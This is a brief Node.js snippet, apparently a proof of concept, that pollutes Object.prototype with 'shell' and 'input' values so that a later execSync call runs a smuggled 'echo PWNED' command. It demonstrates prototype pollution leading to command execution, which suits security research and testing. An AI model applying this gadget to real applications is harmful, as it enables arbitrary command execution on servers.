const { exec, execSync } = require('child_process');

Object.prototype.shell = 'cmd.exe.';
Object.prototype.input = 'echo PWNED\n';

const output = execSync('echo "NORMAL EXECUTION"');
console.log(output.toString());
